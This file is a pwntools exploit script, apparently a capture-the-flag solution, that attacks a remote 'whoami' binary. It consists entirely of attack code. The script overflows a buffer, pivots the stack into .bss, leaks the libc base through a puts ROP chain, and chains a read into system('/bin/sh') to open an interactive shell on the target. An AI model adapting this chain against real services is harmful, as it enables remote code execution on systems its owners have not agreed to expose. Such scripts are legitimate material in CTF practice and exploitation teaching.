from pwn import *

context.log_level = 'debug'

io = remote('172.35.58.21', 9999)
# io = process('./whoami')
elf = ELF('./whoami')
libc = ELF('./libc-2.27.so')

rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s,addr		: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))


bss_addr = 0x601040
leave_ret = 0x4007d6
rdi_ret = 0x400843
rsi_r15_ret = 0x400841
read_0xf0_ret = 0x4007BB
puts_got = 0x600FC0
puts_plt = 0x400580
read_plt = 0x4005A0

payload1 = 'A'*0x20
payload1 += p64(bss_addr+0xc0)
payload1 += p64(leave_ret)
sa('name:', payload1)

payload2 = '\x00'*0xc0
payload2 += p64(bss_addr+0x70)
payload2 += p64(rdi_ret)
payload2 += p64(puts_got)
payload2 += p64(puts_plt)

payload2 += p64(read_0xf0_ret)
sa('Else?', payload2)

rl()
libc_base = uu64(rl()) - libc.symbols['puts']
lg('libc_base', libc_base)

system_addr = libc_base + libc.symbols['system']
payload3 = '\x00'*0x70
payload3 += p64(bss_addr+0x308)
payload3 += p64(rdi_ret)
payload3 += p64(0)
payload3 += p64(rsi_r15_ret)
payload3 += p64(bss_addr+0x308)
payload3 += p64(0)
payload3 += p64(read_plt)
payload3 += p64(leave_ret)
sl(payload3)

payload4 = p64(bss_addr+0x400)
payload4 += p64(rdi_ret)
payload4 += p64(bss_addr+0x308+0x20)
payload4 += p64(system_addr)
payload4 += '/bin/sh\x00'
sl(payload4)

# pause()

irt()
